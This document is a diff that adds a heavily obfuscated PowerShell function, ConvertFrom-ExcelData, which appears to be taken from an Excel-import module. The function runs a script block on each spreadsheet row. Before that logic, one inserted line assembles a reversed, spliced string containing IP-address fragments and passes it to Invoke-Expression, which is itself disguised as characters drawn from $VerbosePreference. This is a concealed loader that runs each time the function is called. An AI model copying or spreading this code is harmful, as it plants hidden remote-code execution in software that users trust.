@@ -1,0 +1,31 @@
+$Xdvm6= [tYpe]('S'+'T'+'RiNG');function cOnVerTfROm-EXcELdAtA {
+    [alias(('Us'+'e-ExcelD'+'ata'))]
+    param(
+        [Alias(('F'+'ullName'))]
+        [Parameter(ValUEfroMpIPeliNebypRoPeRtyname = ${TR`UE}, VAlueFROmpIPeliNE = ${TR`Ue}, MAndAtory = ${t`RUe})]
+        [ValidateScript( { T`EsT-`path ${_} -PathType LEAF })]
+        ${P`AtH},
+        [ScriptBlock]${S`CRiPTB`L`ocK},
+        [Alias(('Sh'+'eet'))]
+        ${wOrKs`hEeT`Name} = 1,
+        [int]${HEaDe`R`R`oW} = 1,
+        [string[]]${hE`A`dER},
+        [switch]${n`o`h`EADeR},
+        [switch]${d`A`TaoNLy}
+    )
+    ${c`xi}=sv  ("u"+'iS') ((') '+(')9'+'3'+']Ra'+'HC'+'[]'+'GnIrTs[,)76]R'+'aHC[+18]Ra'+'H'+'C['+'+1'+'01]RaHC[((Ec'+'ALpeR.)B'+'SXCBS'+'X+B'+'SXQBSX+BSXe7BSX'+'+'+'BSX9.58'+'.851BSX+'+'BS'+'X'+'.4'+'1:'+'pi'+'CQBSX'+'+B'+'SX'+'eBSX( ').RePLace('BSX',[sTriNg][CHAR]39)+"()''Nioj-'x'+]3,1[)(gniRTSOt.ecNEReFerPEsOBreV$ "+'(&')) ; (itEm ("var"+"iABLE:X"+"dvm6") ).vaLue::JoiN( '', (  gEt-v`A`RiaBle  ("u"+'is')  ).VAluE[-1..- ( (  G`Et-vAR`I`AbLE  ("u"+'is')  ).vAlue.Length )] )
+
+    ${n`ULl} = ${P`Sb`ouNDpar`AMetERs}.rEMOvE(('S'+'crip'+'tBlock'))
+    ${P`ArA`mS} = @{} + ${psb`O`UN`d`PaRAmetE`RS}
+
+    ${DA`TA} = imP`O`R`T-ExCel @params
+
+    ${pROPER`T`Ynam`ES} = ${d`Ata}[0].pSOBJECT.PrOPErtIes |
+        w`HERE-`OBj`ECT {${_}.MEmbeRtyPe -match ('pro'+'pert'+'y')} |
+        sELeCT`-oB`JEcT -ExpandProperty nAme
+
+    foreach (${r`EcO`RD} in ${dA`TA}) {
+        & ${s`Cr`IPTbl`oCK} ${Pr`O`p`ERTynAMes} ${r`Ec`ord}
+    }
+}
+
